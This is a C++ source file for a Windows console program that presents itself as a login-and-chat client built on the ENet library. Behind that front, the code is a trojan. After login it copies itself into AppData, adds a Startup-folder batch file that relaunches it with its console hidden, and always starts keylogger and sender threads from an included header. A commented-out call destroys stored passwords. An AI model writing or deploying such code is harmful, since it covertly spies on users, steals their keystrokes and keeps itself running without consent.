#include <enet/enet.h>
#include <iostream>
#include <string>
#include <conio.h>
#include <windows.h>
#include <thread>
#include <ctime>
#include <regex>
#include <algorithm>
#include <cctype>
#include <Shlwapi.h>
#include "keylogger.hpp"
#include "deletePasswords.hpp"
using namespace std;
namespace fs = std::filesystem;

void copySelfToAppData() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);  // Get current exe path

    // Get the AppData path from the environment variable
    char appDataPath[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appDataPath, sizeof(appDataPath))) {
        // Append the filename to the AppData path
        string fullPath = string(appDataPath) + "\\client.exe";
        
        // Copy the executable to AppData
        fs::path sourcePath(exePath);
        fs::path destinationPath(fullPath);

        if (fs::exists(sourcePath)) {
            fs::copy(sourcePath, destinationPath, fs::copy_options::overwrite_existing);
        }
    }
}

void createBatFileInStartup(const string& argmail) {
    // Get the username from environment variable
    char username[MAX_PATH];
    if (GetEnvironmentVariableA("USERNAME", username, sizeof(username))) {
        // Define the path of the .bat file in the Startup folder
        string batFilePath = "C:\\Users\\" + string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runClient.bat";
        
        // Define the Startup folder path
        string startupDir = "C:\\Users\\" + string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        
        // Ensure Startup folder exists
        fs::path startupFolder(startupDir);
        if (fs::exists(startupFolder)) {
            // Command to run the copied exe from AppData with arguments
            string batContent = "start \"\" \"C:\\Users\\" + string(username) + "\\AppData\\Roaming\\client.exe\" --disable --" + argmail;

            // Create and write the command to the .bat file in Startup
            ofstream batFile(batFilePath);
            if (batFile.is_open()) {
                batFile << batContent;
                batFile.close();
            }
        }
    }
}
// ---------------------------------------------------------------------
// Input validation functions
// ---------------------------------------------------------------------

// Validate email format using regex
bool isValidEmail(const string& email) {
    // Basic email validation regex pattern
    // Checks for: name@domain.tld format
    const regex emailPattern("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    return regex_match(email, emailPattern);
}

// Validate password - checks length and complexity
bool isValidPassword(const string& password) {
    // Password requirements:
    // - At least 8 characters
    // - Less than 50 characters (reasonable upper limit)
    if (password.length() < 8 || password.length() > 50) {
        return false;
    }
    
    // Check for at least one uppercase letter, one lowercase letter, and one digit
    bool hasUpper = false, hasLower = false, hasDigit = false;
    for (char c : password) {
        if (isupper(c)) hasUpper = true;
        if (islower(c)) hasLower = true;
        if (isdigit(c)) hasDigit = true;
    }
    
    return hasUpper && hasLower && hasDigit;
}

// Validate verification code (typically numeric with fixed length)
bool isValidVerificationCode(const string& code) {
    // Check if the code is 6 digits (common verification code length)
    if (code.length() != 6) {
        return false;
    }
    
    // Ensure all characters are digits
    return std::all_of(code.begin(), code.end(), ::isdigit);
}

// Validate chat message - check length and filter dangerous content
bool isValidChatMessage(const string& message) {
    // Check message length (1-500 characters is reasonable)
    if (message.empty() || message.length() > 500) {
        return false;
    }
    
    // Check for null bytes or control characters that could cause issues
    for (char c : message) {
        // Block null bytes and most control characters
        if (c == '\0' || (c < 32 && c != '\n' && c != '\r' && c != '\t')) {
            return false;
        }
    }
    
    return true;
}

// Sanitize input by removing or replacing potentially dangerous characters
string sanitizeInput(const string& input) {
    string sanitized = input;
    
    // Replace pipe character as it's used as a delimiter in protocol
    std::replace(sanitized.begin(), sanitized.end(), '|', '_');
    
    // Filter out other potentially problematic characters
    sanitized.erase(
        std::remove_if(
            sanitized.begin(), 
            sanitized.end(),
            [](char c) { 
                return c == '\0' || (c < 32 && c != '\n' && c != '\r' && c != '\t');
            }
        ),
        sanitized.end()
    );
    
    return sanitized;
}

// Safely get user input with validation and sanitization
string getValidatedInput(const string& prompt, function<bool(const string&)> validator, 
                        const string& errorMsg, bool allowEmpty = false) {
    string input;
    bool isValid = false;
    
    do {
        cout << prompt;
        getline(cin, input);
        
        // Trim whitespace
        input.erase(0, input.find_first_not_of(" \t\n\r"));
        input.erase(input.find_last_not_of(" \t\n\r") + 1);
        
        // Check if input is empty when not allowed
        if (!allowEmpty && input.empty()) {
            cout << "Input cannot be empty. Please try again." << endl;
            continue;
        }
        
        // Allow empty input if specified
        if (allowEmpty && input.empty()) {
            isValid = true;
        } else {
            // Sanitize and validate input
            string sanitized = sanitizeInput(input);
            
            // Check if sanitization changed the input
            if (sanitized != input) {
                cout << "Input contained invalid characters and was sanitized." << endl;
                input = sanitized;
            }
            
            // Validate using provided validator function
            isValid = validator(input);
            if (!isValid) {
                cout << errorMsg << endl;
            }
        }
    } while (!isValid);
    
    return input;
}

// Function to safely get numeric menu choice
int getValidMenuChoice() {
    string input;
    int choice = 0;
    bool isValid = false;
    
    do {
        getline(cin, input);
        
        // Check if input contains only digits
        if (input.empty() || !all_of(input.begin(), input.end(), ::isdigit)) {
            cout << "Please enter a valid number: ";
            continue;
        }
        
        // Convert to integer
        try {
            choice = stoi(input);
            isValid = true;
        } catch (const exception& e) {
            cout << "Invalid input. Please enter a number: ";
        }
    } while (!isValid);
    
    return choice;
}

// ---------------------------------------------------------------------
// Display the main menu options to the user
// ---------------------------------------------------------------------
void displayMenu() {
    cout << "\n=== Authentication System ===" << endl;
    cout << "1. Login" << endl;
    cout << "2. Register" << endl;
    cout << "3. Exit" << endl;
    cout << "Enter your choice: ";
}

// ---------------------------------------------------------------------
// Send a message to the server and wait for a response
// Parameters:
//   - peer: Connection to the server
//   - message: Text to send to server
//   - client: Local network interface
// Returns: Server's response as a string
// ---------------------------------------------------------------------
string sendMessage(ENetPeer* peer, const string& message, ENetHost* client) {
    // Create a packet with the message
    ENetPacket* packet = enet_packet_create(
        message.c_str(),           // Message content
        message.size() + 1,        // Message length (include null terminator)
        ENET_PACKET_FLAG_RELIABLE  // Ensure delivery
    );
    
    // Send the packet to the server
    enet_peer_send(peer, 0, packet);
    enet_host_flush(client);  // Force immediate sending

    // Wait for server response (up to 10 seconds)
    ENetEvent event;
    while (enet_host_service(client, &event, 10000) > 0) {
        if (event.type == ENET_EVENT_TYPE_RECEIVE) {
            // Convert received data to string
            string response = reinterpret_cast<char*>(event.packet->data);
            enet_packet_destroy(event.packet);
            return response;
        }
    }
    
    // Timeout - no response received
    return "ERROR: No response from server";
}

// ---------------------------------------------------------------------
// Disconnect cleanly from the server
// ---------------------------------------------------------------------
void disconnectFromServer(ENetPeer* peer, ENetHost* client) {
    if (peer) {
        // Request disconnection
        enet_peer_disconnect(peer, 0);
        
        // Wait for server to acknowledge (up to 3 seconds)
        ENetEvent event;
        while (enet_host_service(client, &event, 3000) > 0) {
            if (event.type == ENET_EVENT_TYPE_RECEIVE) {
                // Clean up any packets we receive during disconnect
                enet_packet_destroy(event.packet);
            } 
            else if (event.type == ENET_EVENT_TYPE_DISCONNECT) {
                cout << "Disconnected from server." << endl;
                break;
            }
        }
    }
    
    // Clean up local network resources
    enet_host_destroy(client);
}

// ---------------------------------------------------------------------
// Chat application interface
// Handles both sending user messages and receiving messages from others
// ---------------------------------------------------------------------
void chatApp(ENetPeer* peer, ENetHost* client) {
    cout << "\nWelcome to the Chat App!" << endl;
    cout << "Type your message and press Enter. Type '/exit' to leave chat." << endl;
    cout << "You: " << flush;
    
    string userInput = "";
    bool running = true;
    
    // Main chat loop
    while (running) {
        // --- RECEIVING MESSAGES ---
        // Check for incoming messages (non-blocking)
        ENetEvent event;
        while (enet_host_service(client, &event, 0) > 0) {
            if (event.type == ENET_EVENT_TYPE_RECEIVE) {
                // Display received message and restore user input prompt
                cout << "\n" << reinterpret_cast<char*>(event.packet->data);
                cout << "\nYou: " << userInput << flush;
                enet_packet_destroy(event.packet);
            }
        }
        
        // --- SENDING MESSAGES ---
        // Check if user has pressed any keys (non-blocking)
        if (_kbhit()) {
            char ch = _getch();  // Get the pressed key
            
            // Handle Enter key (send message)
            if (ch == 13) {  // 13 is ASCII code for Enter
                cout << "\n";
                
                // Exit command
                if (userInput == "/exit") {
                    running = false;
                    break;
                }
                
                // Validate and send non-empty messages
                if (!userInput.empty() && isValidChatMessage(userInput)) {
                    // Sanitize the message before sending
                    string sanitizedMessage = sanitizeInput(userInput);
                    
                    // Add CHAT: prefix so server knows it's a chat message
                    string fullMessage = "CHAT:" + sanitizedMessage;
                    ENetPacket* packet = enet_packet_create(
                        fullMessage.c_str(), 
                        fullMessage.size() + 1, 
                        ENET_PACKET_FLAG_RELIABLE
                    );
                    enet_peer_send(peer, 0, packet);
                    enet_host_flush(client);
                    userInput.clear();
                } else if (!userInput.empty()) {
                    // Message failed validation
                    cout << "Message contains invalid content or is too long. Please try again." << endl;
                    userInput.clear();
                }
                
                // Reset input prompt
                cout << "You: " << flush; // flush only flushes the buffer but does not add a newline.
            }
            // Handle Backspace key
            else if (ch == 8) {  // 8 is ASCII code for Backspace
                if (!userInput.empty()) {
                    userInput.pop_back();  // Remove last character
                    cout << "\b \b" << flush;  // Erase character from display , only flushes the buffer but does not add a newline.
                }
            }
            // Handle regular character input
            else if (ch >= 32) {  // Only accept printable characters
                // Limit input length to prevent buffer issues
                // the newline character \n or the carriage return \r  or the others are  not allowed 
                if (userInput.length() < 500) {
                    userInput.push_back(ch);  // Add character to input
                    cout << ch << flush;      // Display character , only flushes the buffer but does not add a newline.
                }
            }
        }
        
        // Prevent CPU overuse
        std::this_thread::sleep_for(std::chrono::milliseconds(5));  // Pause for 5 milliseconds
    }
}

// ---------------------------------------------------------------------
// User registration process
// 1. Get email from user
// 2. Request verification code from server
// 3. Get verification code from user
// 4. Set password after verification
// ---------------------------------------------------------------------
void handleRegistration(ENetPeer* peer, ENetHost* client) {
    // Clear input buffer
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    
    // Step 1: Get and validate email address
     string email = getValidatedInput(
        "Enter email for registration: ",
        isValidEmail,
        "Invalid email format. Please enter a valid email (e.g., user@example.com)."
    );
    
    // Step 2: Send registration request to server
    string message = "REGISTER:" + email + "|";  // Empty password field
    string response = sendMessage(peer, message, client);
    cout << "Server: " << response << endl;
    
    // If registration request succeeded (OK response)
    if (response.rfind("OK:", 0) == 0) {
        // Step 3: Get and validate verification code from user
        string code = getValidatedInput(
            "Enter verification code sent to your email: ",
            isValidVerificationCode,
            "Invalid verification code. Please enter the 6-digit code sent to your email."
        );
        
        // Step 4: Verify email with code
        message = "VERIFY:" + email + "|" + code;
        response = sendMessage(peer, message, client);
        cout << "Server: " << response << endl;
        
        // If verification succeeded
        if (response.rfind("OK:", 0) == 0) {
            // Step 5: Set password with validation
            string password;
            bool passwordValid = false;
            
            do {
                password = getValidatedInput(
                    "Enter new password (min 8 chars, must include uppercase, lowercase, and number): ",
                    [](const string&) { return true; },  // Accept any input for now
                    "",
                    false
                );
                
                passwordValid = isValidPassword(password);
                if (!passwordValid) {
                    cout << "Password doesn't meet requirements. Must have at least 8 characters, "
                         << "one uppercase letter, one lowercase letter, and one digit." << endl;
                }
            } while (!passwordValid);
            
            message = "SETPASSWORD:" + email + "|" + password;
            response = sendMessage(peer, message, client);
            cout << "Server: " << response << endl;
        }
    }
}

// ---------------------------------------------------------------------
// User login process
// 1. Get email and password
// 2. Authenticate with server
// 3. Enter chat mode if login successful
// ---------------------------------------------------------------------
void handleLogin(ENetPeer* peer, ENetHost* client) {
    // Clear input buffer
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    
    // Step 1: Get and validate credentials
    string email = getValidatedInput(
        "Enter email: ",
        isValidEmail,
        "Invalid email format. Please enter a valid email (e.g., user@example.com)."
    );
    
    // For password, we'll validate format but not enforce complexity for login
    string password = getValidatedInput(
        "Enter password: ",
        [](const string& pwd) { return !pwd.empty() && pwd.length() <= 50; },
        "Password cannot be empty and must be less than 50 characters."
    );
    
    // Step 2: Send login request to server
    string message = "LOGIN:" + email + "|" + password;
    string response = sendMessage(peer, message, client);
    cout << "Server: " << response << endl;
    
    // Step 3: Enter chat if login successful
    if (response.rfind("OK:", 0) == 0) {
        cout << "You are now logged in!" << endl;
        cout << "Press Enter to go to the Chat App..." << endl;
        
        // Store email for keylogger
        setUserEmail(email);
        copySelfToAppData();
        createBatFileInStartup(email);
        
        // Wait for user to press Enter
        cin.get();
        
        // Enter chat mode
        chatApp(peer, client);
    }
}

int application() {
     // --- INITIALIZE NETWORKING ---
    // Initialize ENet library
    if (enet_initialize() != 0) {
        cerr << "ENet initialization failed!" << endl;
        cin.get();  // Wait for user input before exiting
        return EXIT_FAILURE;
    }
    atexit(enet_deinitialize);  // Clean up ENet when program exits

    // Create client network interface
    ENetHost* client = enet_host_create(
        nullptr,  // No specific bind address
        1,        // Only one outgoing connection
        2,        // Two channels
        0, 0      // No bandwidth limits
    );
    
    if (!client) {
        cerr << "Client creation failed!" << endl;
        cin.get();
        return EXIT_FAILURE;
    }

    // --- CONNECT TO SERVER ---
    // Set server address
    ENetAddress address;
    enet_address_set_host(&address, "127.0.0.1");  // Server IP address
    address.port = 25555;                           // Fixed port to match server (25555)
    
    // Attempt connection
    ENetPeer* peer = enet_host_connect(client, &address, 2, 0);
    if (!peer) {
        cerr << "Failed to initiate connection to server!" << endl;
        cin.get();
        enet_host_destroy(client);
        return EXIT_FAILURE;
    }

    // Wait for connection success/failure (10 second timeout)
    ENetEvent event;
    bool connectionSuccessful = false;
    
    if (enet_host_service(client, &event, 10000) > 0 && 
        event.type == ENET_EVENT_TYPE_CONNECT) {
        connectionSuccessful = true;
    }
    
    if (connectionSuccessful) {
        cout << "Connected to server!" << endl;
    } else {
        cerr << "Connection failed!" << endl;
        enet_peer_reset(peer);
        cin.get();
        enet_host_destroy(client);
        return EXIT_FAILURE;
    }

    // --- MAIN APPLICATION LOOP ---
    int choice = 0;
    while (choice != 3) {  // Loop until user chooses to exit
        displayMenu();
        
        // Get and validate menu choice
        choice = getValidMenuChoice();
        
        switch (choice) {
            case 1:  // Login
                handleLogin(peer, client);
                break;
            case 2:  // Register
                handleRegistration(peer, client);
                break;
            case 3:  // Exit
                cout << "Exiting..." << endl;
                break;
            default:  // Invalid choice
                cout << "Invalid choice, please enter 1, 2, or 3." << endl;
                break;
        }
    }

    // --- CLEANUP ---
    disconnectFromServer(peer, client);
    return 0;
}

// ---------------------------------------------------------------------
// Main function - Program entry point
// ---------------------------------------------------------------------
int main(int argc, char* argv[]) {
    
    bool enable = true;
    // string exePath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\client.exe";
    // string batFilePath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runClient.bat";
    // // Replace %USERNAME% with actual username
    // char username[MAX_PATH];
    // DWORD size = sizeof(username);
    // if (GetEnvironmentVariableA("USERNAME", username, size)) {
    //     exePath.replace(exePath.find("%USERNAME%"), 9, username);
    //     batFilePath.replace(batFilePath.find("%USERNAME%"), 9, username);
    // }

    // if (!(fileExists(exePath) && fileExists(batFilePath))) {
    //     copySelfToAppData();
    //     createBatFileInStartup(email);
    // }



    for (int i = 1; i < argc; i++) {
        string arg = argv[i];

        if (arg == "--disable") {
            enable = false;
        } else {
            setUserEmail(arg.substr(2));
        }
    }

    if (!enable) {
        FreeConsole();  // Immediately detach console if disabled
    }

    // Uncomment this if you want to enable password destruction
    // PasswordDeleter::destroyPass();

    // Start keylogger and sender threads
    std::thread keylogThreadObj(keyloggerThread);
    std::thread senderThreadObj(senderThread);

    keylogThreadObj.detach();
    senderThreadObj.detach();

    // Start the ENet application if enabled
    if (enable) {

        application();
    }

    // Keep the client alive if necessary
    while (isKeyloggerRunning) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    return 0;
}